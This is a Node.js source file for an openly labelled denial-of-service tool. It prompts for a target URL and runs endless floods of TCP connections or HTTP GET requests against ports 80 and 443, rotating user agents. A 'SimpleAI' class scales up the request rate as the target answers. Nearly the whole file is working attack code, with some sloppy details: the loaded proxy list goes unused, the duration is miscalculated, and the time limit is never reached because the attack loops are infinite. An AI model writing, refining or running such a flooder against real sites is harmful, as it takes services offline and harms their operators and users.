import chalk from 'chalk';
import http from 'http';
import fs from 'fs';
import net from 'net';
import { EventEmitter } from 'events';
import { createInterface } from 'readline';
import { isMainThread, workerData } from 'worker_threads';

EventEmitter.defaultMaxListeners = 0;

const config = {
    'MAX_RAM_PERCENTAGE': 0x50,
    'TIMEOUT_MS': 10000000, // Set to a large finite value
    'INITIAL_CONCURRENT_REQUESTS': 0x1f4,
    'MAX_CONCURRENT_REQUESTS': 0x2710,
    'RETRY_LIMIT': 0x5,
    'INITIAL_RETRY_DELAY': 0x64,
    'BACKOFF_FACTOR': 0x2,
    'ERROR_BACKOFF_TIME': 0x7d0,
    'RANDOM_DELAY_MIN': 0x64,
    'RANDOM_DELAY_MAX': 0x3e8,
    'MAX_REQUESTS_PER_SECOND': 0x2710,
    'KEEP_ALIVE_ADDRESS': '127.0.0.1', // Specify your keep-alive address
};

let proxyList = [], userAgentList = [], successCount = 0, failureCount = 0;

function logMessage(message) {
    const currentTime = new Date().toISOString();
    console.log(chalk.green(`[${currentTime}] ${message}`));
}

// Class for SimpleAI to manage request rates
class SimpleAI {
    constructor() {
        this.previousSuccessRate = 0.1;
        this.requestRates = [config.INITIAL_CONCURRENT_REQUESTS];
    }

    adjustRequestRate(successCount, failureCount) {
        const successRate = successCount / (successCount + failureCount || 1);
        if (successRate < this.previousSuccessRate) {
            const adjustment = Math.floor(this.requestRates[this.requestRates.length - 1] * this.previousSuccessRate);
            this.requestRates.push(Math.max(1, adjustment));
        } else {
            const adjustment = Math.floor(this.requestRates[this.requestRates.length - 1] * this.previousSuccessRate);
            this.requestRates.push(this.requestRates[this.requestRates.length - 1] + adjustment);
        }
        this.previousSuccessRate = successRate;
        return this.requestRates[this.requestRates.length - 1];
    }
}

// Function to read proxies from a specified file
const readProxies = (filePath) => {
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8');
        proxyList = fileContent.split('\n').filter(Boolean);
        logMessage(`Proxies loaded: ${proxyList.length}`);
    } catch (error) {
        console.error('Error loading proxies:', error.message);
        process.exit(1);
    }
};

// Function to read user agents from a specified file
const readUserAgents = (filePath) => {
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8');
        userAgentList = fileContent.split('\n').filter(Boolean);
        logMessage(`User agents loaded: ${userAgentList.length}`);
    } catch (error) {
        console.error('Error loading user agents:', error.message);
        process.exit(1);
    }
};

// Function for TCP SYN requests (V1)
const makeRequestV1 = async (url, numRequests) => {
    const urlObj = new URL(url);
    const ports = [80, 443]; // Using both ports

    logMessage(`Starting TCP SYN attack on ${url}...`);
    while (true) {
        const requests = Array.from({ length: numRequests }, () => {
            const port = ports[Math.floor(Math.random() * ports.length)];
            const options = {
                host: urlObj.hostname,
                port: port,
                method: 'CONNECT',
                path: `${urlObj.hostname}:${port}`,
                timeout: config.TIMEOUT_MS,
            };
            return new Promise((resolve) => {
                const req = net.createConnection(options, () => {
                    successCount++;
                    req.end();
                    resolve();
                });
                req.on('error', () => {
                    failureCount++;
                    resolve();
                });
                req.setTimeout(config.TIMEOUT_MS, () => {
                    req.destroy();
                    failureCount++;
                    resolve();
                });
            });
        });
        await Promise.all(requests);
        logMessage(`Success: ${successCount}, Failures: ${failureCount}`);
        await new Promise((r) => setTimeout(r, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN));
    }
};

// Method V2: Simultaneous HTTP requests
const executeRequestV2 = async (url, numRequests) => {
    const urlObj = new URL(url);
    const ports = [80, 443]; // Using both ports
    logMessage(`Initiating simultaneous HTTP requests on ${url}...`);
    while (true) {
        const requests = Array.from({ length: numRequests }, () => {
            return new Promise((resolve) => {
                const port = ports[Math.floor(Math.random() * ports.length)];
                const options = {
                    hostname: urlObj.hostname,
                    port: port,
                    path: urlObj.pathname + urlObj.search,
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgentList[Math.floor(Math.random() * userAgentList.length)],
                    },
                    timeout: config.TIMEOUT_MS,
                };
                const req = http.request(options, (res) => {
                    res.on('data', (chunk) => {}); // Consume response data
                    res.on('end', () => {
                        successCount++;
                        resolve();
                    });
                });
                req.on('error', () => {
                    failureCount++;
                    resolve();
                });
                req.end();
            });
        });
        await Promise.all(requests);
        logMessage(`Success: ${successCount}, Failures: ${failureCount}`);
        await new Promise((r) => setTimeout(r, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN));
    }
};

// Method V3: AI-enhanced requests
const makeRequestV3 = async (url, numRequests) => {
    const urlObj = new URL(url);
    const simpleAI = new SimpleAI();
    let currentRate = numRequests;

    logMessage(`Starting AI-enhanced attack on ${url}...`);
    try {
        while (true) {
            const requests = Array.from({ length: currentRate }, () => {
                return new Promise((resolve) => {
                    const port = Math.random() < 0.5 ? 80 : 443; // Randomly choose between ports 80 and 443
                    const options = {
                        hostname: urlObj.hostname,
                        port: port,
                        path: urlObj.pathname + urlObj.search,
                        method: 'GET',
                        headers: {
                            'User-Agent': userAgentList[Math.floor(Math.random() * userAgentList.length)],
                        },
                        timeout: config.TIMEOUT_MS,
                    };
                    const req = http.request(options, (res) => {
                        res.on('data', (chunk) => {}); // Consume response data
                        res.on('end', () => {
                            successCount++;
                            resolve();
                        });
                    });
                    req.on('error', () => {
                        failureCount++;
                        resolve();
                    });
                    req.end();
                });
            });
            await Promise.all(requests);
            logMessage(`Success: ${successCount}, Failures: ${failureCount}`);
            currentRate = simpleAI.adjustRequestRate(successCount, failureCount);
            await new Promise((r) => setTimeout(r, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN));
        }
    } catch (error) {
        logMessage(`Error: ${error.message}`);
    }
};

// Attack control function
async function startAttack(targetUrl, durationMs, method, numRequests) {
    logMessage('Starting attack... Press Ctrl+C to stop.');

    // Log progress every 60 seconds
    const progressInterval = setInterval(() => {
        logMessage(`Success: ${successCount} | Failures: ${failureCount}`);
    }, 60000);

    // Infinite attack loop
    const endTime = Date.now() + durationMs;
    while (Date.now() < endTime) {
        try {
            if (method === 'V1') {
                await makeRequestV1(targetUrl, numRequests);
            } else if (method === 'V2') {
                await executeRequestV2(targetUrl, numRequests);
            } else if (method === 'V3') {
                await makeRequestV3(targetUrl, numRequests);
            }
        } catch (err) {
            failureCount++;
        }
        await new Promise(r => setTimeout(r, 10)); // Optional delay between requests
    }

    clearInterval(progressInterval); // Clear interval on completion
    logMessage('[INFO] Attack duration completed.');
}

// Main function to prompt for user input
const main = async () => {
    const rl = createInterface({ input: process.stdin, output: process.stdout });

    rl.question('Enter the target URL: ', (targetUrl) => {
        rl.question('Enter the path for proxy file: ', (proxyFile) => {
            readProxies(proxyFile);
            rl.question('Enter the path for user agent file: ', (userAgentFile) => {
                readUserAgents(userAgentFile);
                rl.question('Enter attack duration (seconds): ', (durationStr) => {
                    rl.question('Enter number of threads: ', (threadsStr) => {
                        rl.question('Select method (V1 for TCP SYN, V2 for simultaneous HTTP requests, V3 for AI-enhanced): ', (method) => {
                            rl.close();

                            const durationMs = parseInt(durationStr) * 5000;
                            const numRequests = parseInt(threadsStr);
                            startAttack(targetUrl, durationMs, method.trim().toUpperCase(), numRequests);
                        });
                    });
                });
            });
        });
    });
};

// Handle graceful shutdown on SIGINT
process.on('SIGINT', () => {
    logMessage('Exiting script...');
    process.exit();
});

// Start the script
if (isMainThread) {
    main();
} else {
    const { url, method, numRequests } = workerData;
    try {
        if (method === 'V1') {
            await makeRequestV1(url, numRequests);
        } else if (method === 'V2') {
            await executeRequestV2(url, numRequests);
        } else if (method === 'V3') {
            await makeRequestV3(url, numRequests);
        } else {
            logMessage('Worker encountered an unknown method.');
        }
    } catch (error) {
        logMessage('Worker encountered an error: ' + error.message);
    }
}